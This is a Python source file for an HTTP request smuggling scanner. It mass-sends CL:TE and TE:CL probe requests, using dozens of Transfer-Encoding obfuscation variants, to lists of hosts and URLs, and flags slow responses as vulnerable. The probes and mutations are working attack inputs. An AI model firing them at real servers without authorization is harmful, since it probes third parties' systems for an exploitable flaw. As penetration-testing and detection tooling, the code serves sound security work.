#!/usr/bin/python3
"""
HTTP Request Smuggling Detection Tool ..beta..
Based on research by James Kettle (@albinowax)
https://portswigger.net/web-security/request-smuggling

Original: https://github.com/gwen001/pentest-tools/blob/master/smuggler.py
"""

import os
import sys
import ssl
import time
import random
import argparse
import socket
from urllib.parse import urlparse
from threading import Thread
from queue import Queue

import requests
from colored import fg, attr
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

CRLF = "\r\n"
MAX_EXCEPTION = 10
MAX_VULNERABLE = 3

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/60.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
    "Content-Length": "0",
}

COLORS = {
    "ref": "cyan",
    "attack": "white",
    "vulnerable": "light_red",
}

ATTACK_PAYLOADS = [
    {"name": "CL:TE1", "Content-Length": 5,  "body": "1\r\nZ\r\nQ\r\n\r\n"},
    {"name": "CL:TE2", "Content-Length": 11, "body": "1\r\nZ\r\nQ\r\n\r\n"},
    {"name": "TE:CL1", "Content-Length": 5,  "body": "0\r\n\r\n"},
    {"name": "TE:CL2", "Content-Length": 6,  "body": "0\r\n\r\nX"},
]

# All registered obfuscation methods to test
REGISTERED_METHODS = [
    "vanilla",
    "dualchunk",
    "badwrap",
    "space1",
    "badsetupLF",
    "gareth1",
    "spacejoin1",
    "nameprefix1",
    "valueprefix1",
    "nospace1",
    "commaCow",
    "cowComma",
    "contentEnc",
    "linewrapped1",
    "quoted",
    "aposed",
    "badsetupCR",
    "vertwrap",
    "tabwrap",
    "lazygrep",
    "multiCase",
    "zdwrap",
    "zdspam",
    "revdualchunk",
    "nested",
    # Character-based space substitutions
    "spacefix1_0",   "spacefix1_9",   "spacefix1_11",  "spacefix1_12",
    "spacefix1_13",  "spacefix1_127", "spacefix1_160", "spacefix1_255",
    # Character-based value prefixes
    "prefix1_0",   "prefix1_9",   "prefix1_11",  "prefix1_12",
    "prefix1_13",  "prefix1_127", "prefix1_160", "prefix1_255",
    # Character-based value suffixes
    "suffix1_0",   "suffix1_9",   "suffix1_11",  "suffix1_12",
    "suffix1_13",  "suffix1_127", "suffix1_160", "suffix1_255",
]


# ---------------------------------------------------------------------------
# Attack Method Mutations
# ---------------------------------------------------------------------------

class AttackMethod:
    """
    Each method mutates a raw HTTP request string to apply a specific
    Transfer-Encoding obfuscation technique.
    """

    def update_content_length(self, msg: str, cl: int) -> str:
        return msg.replace("Content-Length: 0", f"Content-Length: {cl}")

    # --- Header name/value spacing mutations ---

    def vanilla(self, msg: str) -> str:
        return msg

    def space1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding", "Transfer-Encoding ")

    def nameprefix1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding", " Transfer-Encoding")

    def valueprefix1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:  ")

    def nospace1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:")

    def spacejoin1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding", "Transfer Encoding")

    # --- Header value mutations ---

    def commaCow(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        )

    def cowComma(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: identity, ")

    def contentEnc(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Content-Encoding: ")

    def quoted(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked", 'Transfer-Encoding: "chunked"'
        )

    def aposed(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"
        )

    def lazygrep(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunk")

    def multiCase(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked", "TrAnSFer-EnCODinG: cHuNkeD"
        )

    def nested(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked", "Transfer-Encoding: cow chunked bar"
        )

    def zdspam(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked", "Transfer\r-Encoding: chunked"
        )

    # --- Dual / reversed chunk headers ---

    def dualchunk(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        )

    def revdualchunk(self, msg: str) -> str:
        return msg.replace(
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
        )

    # --- Header line-wrapping / folding mutations ---

    def linewrapped1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:\n")

    def gareth1(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding\n : ")

    def vertwrap(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: \n\u000B")

    def tabwrap(self, msg: str) -> str:
        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: \n\t")

    # --- Header injection via request-line suffix ---

    def badwrap(self, msg: str) -> str:
        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
        msg = msg.replace(
            "HTTP/1.1\r\n",
            "HTTP/1.1\r\n Transfer-Encoding: chunked\r\n",
        )
        return msg

    def badsetupCR(self, msg: str) -> str:
        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
        msg = msg.replace(
            "HTTP/1.1\r\n",
            "HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n",
        )
        return msg

    def badsetupLF(self, msg: str) -> str:
        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
        msg = msg.replace(
            "HTTP/1.1\r\n",
            "HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n",
        )
        return msg

    def zdwrap(self, msg: str) -> str:
        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
        msg = msg.replace(
            "HTTP/1.1\r\n",
            "HTTP/1.1\r\nFoo: bar\r\n\rTransfer-Encoding: chunked\r\n",
        )
        return msg

    # --- Character substitution: space between colon and value ---

    def spacefix1_0(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(0))
    def spacefix1_9(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(9))
    def spacefix1_11(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(11))
    def spacefix1_12(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(12))
    def spacefix1_13(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(13))
    def spacefix1_127(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(127))
    def spacefix1_160(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(160))
    def spacefix1_255(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(255))

    # --- Character substitution: prefix before "chunked" ---

    def prefix1_0(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(0))
    def prefix1_9(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(9))
    def prefix1_11(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(11))
    def prefix1_12(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(12))
    def prefix1_13(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(13))
    def prefix1_127(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(127))
    def prefix1_160(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(160))
    def prefix1_255(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(255))

    # --- Character substitution: suffix after "chunked" ---

    def suffix1_0(self, msg):   return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(0))
    def suffix1_9(self, msg):   return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(9))
    def suffix1_11(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(11))
    def suffix1_12(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(12))
    def suffix1_13(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(13))
    def suffix1_127(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(127))
    def suffix1_160(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(160))
    def suffix1_255(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(255))


# ---------------------------------------------------------------------------
# Raw Socket Request
# ---------------------------------------------------------------------------

class SockRequest:
    """Sends a raw HTTP request over a socket and parses the response."""

    def __init__(self, url: str, message: str):
        self.url = url
        self.message = message
        self.response = ""
        self.length = 0
        self.time = 0
        self.headers = ""
        self.headers_length = 0
        self.t_headers: dict = {}
        self.status_code = -1
        self.status_reason = ""
        self.content = ""
        self.content_length = 0

    def _receive_all(self, sock) -> str:
        for _ in range(100):
            chunk = sock.recv(4096)
            if chunk:
                return chunk.decode(errors="ignore")
        return ""

    def _parse_response(self):
        try:
            self.length = len(self.response)
            split_pos = self.response.find(CRLF + CRLF)
            self.headers = self.response[:split_pos]
            self.headers_length = len(self.headers)
            self.content = self.response[split_pos + len(CRLF + CRLF):]
            self.content_length = len(self.content)

            header_lines = self.headers.split(CRLF)
            status_parts = header_lines[0].split(" ")
            self.status_code = int(status_parts[1])
            self.status_reason = status_parts[2]

            for line in header_lines[1:]:
                if ": " in line:
                    k, _, v = line.partition(": ")
                    self.t_headers[k] = v
        except Exception as e:
            _err(f"_parse_response error: {e}")

    def send(self) -> bool:
        parsed = urlparse(self.url)

        # Determine host and port
        if ":" in parsed.netloc:
            netloc, port_str = parsed.netloc.rsplit(":", 1)
            port = int(port_str)
        else:
            netloc = parsed.netloc
            port = 443 if parsed.scheme == "https" else 80

        if parsed.port:
            port = parsed.port

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if parsed.scheme == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=netloc)

        sock.settimeout(config["timeout"])

        try:
            sock.connect((netloc, port))
        except Exception as e:
            _err(f"send (connect) error: {e} ({self.url})")
            return False

        sock.sendall(self.message.encode())
        start = time.time()

        try:
            self.response = self._receive_all(sock)
        except Exception as e:
            _err(f"send (receive) error: {e} ({self.url})")
            return False

        self.time = (time.time() - start) * 1000

        try:
            sock.shutdown(socket.SHUT_RDWR)
        except Exception as e:
            _err(f"send (shutdown) error: {e} ({self.url})")
            return False

        sock.close()

        if self.response:
            self._parse_response()

        return True


# ---------------------------------------------------------------------------
# Message Generation
# ---------------------------------------------------------------------------

def build_base_message(url: str, headers: dict) -> str:
    """Builds a base POST request string for the given URL."""
    parsed = urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    if parsed.fragment:
        path += "#" + parsed.fragment

    msg = f"POST {path} HTTP/1.1{CRLF}"
    msg += f"Host: {parsed.netloc}{CRLF}"
    for k, v in headers.items():
        msg += f"{k}: {v}{CRLF}"
    msg += CRLF
    return msg


def build_attack_message(
    base_message: str, method: str, payload: dict, am: AttackMethod
) -> str:
    """Applies an obfuscation method and payload to a base request."""
    mutate = getattr(am, method, None)
    if mutate is None:
        return ""

    msg = base_message.strip() + CRLF
    msg = am.update_content_length(msg, payload["Content-Length"])
    msg += "Transfer-Encoding: chunked" + CRLF
    msg += CRLF + payload["body"]
    return mutate(msg)


# ---------------------------------------------------------------------------
# Output Helpers
# ---------------------------------------------------------------------------

def _err(msg: str):
    sys.stdout.write(f"{fg('red')}[-] {msg}{attr(0)}\n")


def print_result(r: SockRequest, r_type: str, method: str, payload: dict):
    content_type = r.t_headers.get("Content-Type", "-")
    label = f"{payload['name']}|{method}" if payload else method
    vuln_flag = "VULNERABLE" if r_type == "vulnerable" else "-"

    line = (
        f"{r.url.ljust(state['url_max_len'])}\t\t"
        f"M={label}\t\t"
        f"C={r.status_code}\t\t"
        f"L={r.length}\t\t"
        f"time={r.time:.0f}\t\t"
        f"T={content_type}\t\t"
        f"V={vuln_flag}\n"
    )

    verbose = config["verbose"]
    if verbose >= 2 or (verbose >= 1 and r_type == "vulnerable"):
        sys.stdout.write(f"{fg(COLORS[r_type])}{line}{attr(0)}")

    with open(state["output_file"], "a+") as fp:
        fp.write(line)
        if r_type == "vulnerable":
            fp.write(f">>>{r.message}<<<\n")

    if verbose >= 3 or (verbose >= 2 and r_type == "vulnerable"):
        sys.stdout.write(f"{fg('dark_gray')}>>>{r.message}<<<{attr(0)}\n")
    if verbose >= 4:
        sys.stdout.write(f"{fg('dark_gray')}>>>{r.response}<<<{attr(0)}\n")


# ---------------------------------------------------------------------------
# Core Test Logic
# ---------------------------------------------------------------------------

def test_url(url: str, am: AttackMethod):
    time.sleep(0.01)

    if config["verbose"] <= 1:
        sys.stdout.write(
            f"progress: {state['n_current']}/{state['n_total']}\r"
        )
    state["n_current"] += 1

    state["exceptions"].setdefault(url, 0)
    state["vulnerable"].setdefault(url, 0)

    if url in state["history"]:
        return
    state["history"].append(url)

    base_msg = build_base_message(url, config["base_headers"])

    # Send a reference (baseline) request
    ref = SockRequest(url, base_msg)
    ref.send()
    if ref.status_code < 0:
        state["exceptions"][url] += 1
    else:
        print_result(ref, "ref", "", {})

    # Try every method × payload combination
    for method in config["methods"]:
        for payload in ATTACK_PAYLOADS:
            if state["exceptions"][url] >= MAX_EXCEPTION:
                if config["verbose"] >= 2:
                    print(f"skip (too many exceptions): {url}")
                return
            if state["vulnerable"][url] >= MAX_VULNERABLE:
                if config["verbose"] >= 2:
                    print(f"skip (already vulnerable): {url}")
                return

            msg = build_attack_message(base_msg, method, payload, am)
            if not msg:
                _err(f"method not implemented: {method}")
                break

            r = SockRequest(url, msg)
            r.send()

            if r.status_code < 0:
                state["exceptions"][url] += 1
            else:
                r_type = "vulnerable" if r.time > 5000 else "attack"
                if r_type == "vulnerable":
                    state["vulnerable"][url] += 1
                print_result(r, r_type, method, payload)


def worker(q: Queue, am: AttackMethod):
    while True:
        url = q.get()
        test_url(url, am)
        q.task_done()


# ---------------------------------------------------------------------------
# CLI / Entry Point
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="HTTP Request Smuggling Detection Tool"
    )
    parser.add_argument("-a", "--path",    help="File containing URL paths to append")
    parser.add_argument("-d", "--header",  help="Custom header (key:value)", action="append")
    parser.add_argument("-i", "--timeout", help="Socket timeout in seconds (default: 30)", type=int, default=30)
    parser.add_argument("-m", "--method",  help="Comma-separated list of methods (default: all)")
    parser.add_argument("-o", "--hosts",   help="Host or file of hosts to test")
    parser.add_argument("-s", "--scheme",  help="Schemes to use, comma-separated (default: http,https)")
    parser.add_argument("-t", "--threads", help="Number of threads (default: 10)", type=int, default=10)
    parser.add_argument("-u", "--urls",    help="URL or file of URLs to test")
    parser.add_argument(
        "-v", "--verbose",
        help="Verbosity: 0=silent, 1=vulnerable only, 2=all, 3=+headers, 4=full debug (default: 1)",
        type=int, default=1,
    )
    return parser.parse_args()


def load_lines(value: str) -> list[str]:
    """Returns lines from a file, or a single-item list if not a file path."""
    if value and os.path.isfile(value):
        with open(value) as f:
            return [line.strip() for line in f if line.strip()]
    return [value] if value else []


def main():
    args = parse_args()

    schemes = args.scheme.split(",") if args.scheme else ["http", "https"]
    methods = args.method.split(",") if args.method else REGISTERED_METHODS

    base_headers = DEFAULT_HEADERS.copy()
    for header in args.header or []:
        if ":" in header:
            k, _, v = header.partition(":")
            base_headers[k.strip()] = v.strip()

    hosts = load_lines(args.hosts)
    urls  = load_lines(args.urls)
    paths = load_lines(args.path) or [""]

    if not hosts and not urls:
        print("Error: provide --hosts or --urls")
        sys.exit(1)

    print(f"{fg('green')}[+] {len(hosts)} host(s) loaded{attr(0)}")
    print(f"{fg('green')}[+] {len(urls)} URL(s) loaded{attr(0)}")
    print(f"{fg('green')}[+] {len(paths)} path(s) loaded{attr(0)}")

    # Build the full target list
    targets: list[str] = []
    for scheme in schemes:
        for host in hosts:
            for path in paths:
                targets.append(f"{scheme}://{host}{path}")
    for url in urls:
        for path in paths:
            targets.append(url + path)

    url_max_len = max((len(u) for u in targets), default=0)

    # Output directory
    output_dir  = os.path.join(os.getcwd(), "smuggler")
    output_file = os.path.join(output_dir, "output")
    os.makedirs(output_dir, exist_ok=True)

    # Shared config and mutable state
    global config, state
    config = {
        "timeout":      args.timeout,
        "verbose":      args.verbose,
        "threads":      args.threads,
        "methods":      methods,
        "base_headers": base_headers,
    }
    state = {
        "history":     [],
        "exceptions":  {},
        "vulnerable":  {},
        "n_current":   0,
        "n_total":     len(targets),
        "url_max_len": url_max_len,
        "output_file": output_file,
    }

    print(
        f"{fg('green')}[+] threads={args.threads}, verbose={args.verbose}{attr(0)}"
    )
    print(f"{fg('green')}[+] {len(targets)} URL(s) to test{attr(0)}")
    print("[+] testing...\n")

    random.shuffle(targets)

    am = AttackMethod()
    q: Queue = Queue(args.threads * 2)

    for _ in range(args.threads):
        t = Thread(target=worker, args=(q, am), daemon=True)
        t.start()

    try:
        for url in targets:
            q.put(url)
        q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(1)


if __name__ == "__main__":
    main()
